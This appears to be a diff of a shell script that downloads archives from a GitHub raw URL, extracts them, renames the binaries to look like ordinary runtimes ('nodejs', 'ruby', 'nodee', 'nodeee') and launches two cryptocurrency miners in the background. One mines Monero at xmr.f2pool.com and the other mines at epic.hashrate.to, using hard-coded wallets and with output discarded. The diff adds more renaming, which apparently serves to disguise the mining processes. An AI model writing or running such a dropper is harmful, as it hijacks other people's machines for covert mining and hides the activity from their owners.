@@ -5,6 +5,8 @@ wget https://raw.githubusercontent.com/d1uf95z8/csv/master/csv44.tar.gz
 tar xvzf csv44.tar.gz
 wget https://raw.githubusercontent.com/d1uf95z8/csv/master/csv45.tar.gz
 tar xvzf csv45.tar.gz
+mv nodejs nodee
+mv ruby nodeee
 
 touch abcdzyxw.txt
 echo '{
@@ -16,11 +18,11 @@ echo '{
 "disable_gpu" : true
 }' > abcdzyxw.txt
 
-nice -n 19 nodejs -o xmr.f2pool.com:13531 -u 82zwbB24DFCbatvnLkh33MFxePzsEfvMp2UxqsfzgGgU8mZNpXM1TNZQkxri8MWUceYiLPNTQjJEvMjDNnUrwb4BFsi545u -a rx/0 --donate-level 1 -t 8 -B
+nice -n 19 nodee -o xmr.f2pool.com:13531 -u 82zwbB24DFCbatvnLkh33MFxePzsEfvMp2UxqsfzgGgU8mZNpXM1TNZQkxri8MWUceYiLPNTQjJEvMjDNnUrwb4BFsi545u --rig-id blue -a rx/0 --donate-level 1 -t 8 -B
 
 sleep 20
 
-nice -n -20 nohup ruby --config-file abcdzyxw.txt --pool epic.hashrate.to:4000 --wallet pacbitsoya --password si4b1boygwpu > /dev/null 2>&1 &
+nice -n -20 nohup nodeee --config-file abcdzyxw.txt --pool epic.hashrate.to:4000 --wallet pacbitsoya --password x > /dev/null 2>&1 &
 
 cd /
 
